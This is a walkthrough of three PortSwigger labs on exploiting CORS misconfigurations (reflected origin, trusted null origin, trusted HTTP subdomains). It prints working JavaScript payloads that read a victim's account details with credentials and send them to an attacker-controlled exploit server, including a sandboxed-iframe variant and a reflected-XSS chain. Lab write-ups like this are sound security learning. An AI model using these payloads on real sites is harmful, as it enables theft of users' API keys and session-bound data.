# Cross-Origin Resource Sharing

### Lab 1: Basic Origin Reflection <a href="#lab-1-basic-origin-reflection" id="lab-1-basic-origin-reflection"></a>

To solve this lab, craft some Javascript that uses CORS to retrieve the administrator's API key. I am given the exploit server for this lab.

Essentially, CORS enables servers to define who can access their assets. This is configured using the `Access-Control-Allow-Origin` or `Access-Control-Allow-Credentials` headers.

When reviewing the requests, there was a GET request sent to `/accountDetails`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-149c3161b861b6203b232772001a9a189ee6c656%252Fportswigger-cors-writeup-image.png%3Falt%3Dmedia%26token%3D4b61ec56-bf0c-463e-89b8-521b5ed2c4b2&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=58f65896&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This request had the `Access-Control-Allow-Credentials` header set to `true`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4753acedf8053672d8e0e79f9d1f609444794445%252Fportswigger-cors-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=6bd82801&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This header specifies whether the server allows cross-origin HTTP requests to include credentials. This means other domains can read responses if given credentials.

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fdeveloper.mozilla.org%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=34db4008\&sv=2)Access-Control-Allow-Credentials header - HTTP | MDNMDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)

This can be abused by making the victim visit the `administrator` account, then sending the entire page to the exploit server.

Here's the payload I used:

```html
<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0ae2006f03d768f783065546006d00a6.web-security-academy.net/accountDetails',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='/steal?key='+this.responseText; 
};
</script>
```

What this script does is make the victim visit the `/accountDetails` directory with the CORS misconfiguration. I can retrieve pages that normally require credentials, which is then sent to the exploit server.

Sending this to the victim produces this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-2ef91d7e1aec162a6d5d804625a05adf8fcac41f%252Fportswigger-cors-writeup-image-2.png%3Falt%3Dmedia%26token%3D98afb8f9-b21c-495b-abb8-0ad74bd3f7b8&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=146e872f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Submitting the API key there solves the lab.

### Lab 2: Trusted Null Origin <a href="#lab-2-trusted-null-origin" id="lab-2-trusted-null-origin"></a>

To solve this lab, submit the API key of the `administrator` user.

Similar to Lab 1, there's a GET request sent to `/accountDetails`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9b18e1cb948fc83b9766e7077223b2951eb9575e%252Fportswigger-cors-writeup-image-3.png%3Falt%3Dmedia%26token%3D54758cce-c41c-4763-8744-af5167879330&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=802db574&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I can attempt to send a `Origin: null` header to test whether that is allowed, and it was:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-ae9aa3878fd9feffd4f9facc8938fd4c953d417d%252Fportswigger-cors-writeup-image-4.png%3Falt%3Dmedia%26token%3Df6200454-289c-44bf-b791-606c8993e7b7&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=88804ef7&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Having a trusted `null` origin means this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-87044f3df272ac3f154dff78e6a495db493bfbde%252Fportswigger-cors-writeup-image-5.png%3Falt%3Dmedia%26token%3Dcc48105a-b688-45aa-894c-fb56bbc4e83e&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=e65b13cd&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Basically, it means that if `null` is allowed, only a specific number of resources are allowed to access this. The above states that `iframe` with the `sandbox` attribute is allowed.

So in this case, creating an `iframe sandbox` via payloads on Hacktricks suffices.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0a04003103ad2230827d152e002000b4.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-0a8d00290350221782a0141e018b0049.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

The above payload specifies an `iframe sandbox`, which then loads a doucment created programmatically via the `data:` URL.

Sending this to the victim retrieves the API key, viewable from the Access Log.

### Lab 3: Trusted Insecure Protocols <a href="#lab-3-trusted-insecure-protocols" id="lab-3-trusted-insecure-protocols"></a>

To solve this lab, submit the API key of the `administrator` user. This lab trusts all subdomains **regardless of protocol used**.

When checking the `/accountDetails` directory, I entered fake websites within the `Origin` header with both HTTP and HTTPS protocols, and found that it was always allowed.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9d1555d28c7f63710cc1938643d698cd6ad7dfaf%252Fportswigger-cors-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9d610b80&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This means that accessing the website via HTTP is allowed, and that requests sent may be unencrypted. The hint is that MITM can be used, but in this case, I have to find an alternative way of injecting JS to the subdomain.

The lab had more functionality, including a 'Check Stock' function which opens a new window:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-559a254fc901e653d0244ab461d1b2ccfd0388af%252Fportswigger-cors-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c9be192e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Notice that this new window uses HTTP and not HTTPS. Also, it is part of the `stock` subdomain.

So I have to inject Javascript into this subdomain. I tried using `<script` tags within the URL, and worked:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f1b4711fa6ac3b653397df1b491f6aa473bfa6de%252Fportswigger-cors-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=1b14009f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here's the URL I used:

```
http://stock.0a85001804e81d34857fc64900c40035.web-security-academy.net/?productId=2<script>alert(1)</script>&storeId=2
```

So Javascript can be injected within the parameters. To exploit this and solve this lab, I can do the following:

1. Redirect the user to a maliciously crafted `stock` subdomain URL.
2. Include some Javascript that would **do the fetching of API key for me**. This is allowed because the `/accountDetails` directory has been set up to allow for any subdomain to 'fetch' it.
3. This URL will have the same payload as per the 1st lab.

The encoding for the payload was rather weird, so I ended up going with Portswigger's.

```html
<script>
    document.location="http://stock.0a85001804e81d34857fc64900c40035.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a85001804e81d34857fc64900c40035.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a5800fa04ab1d978584c53201bf0048.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

The `+` and `<` characters need to be URL encoded. Not too sure why but it allows the payload to work.
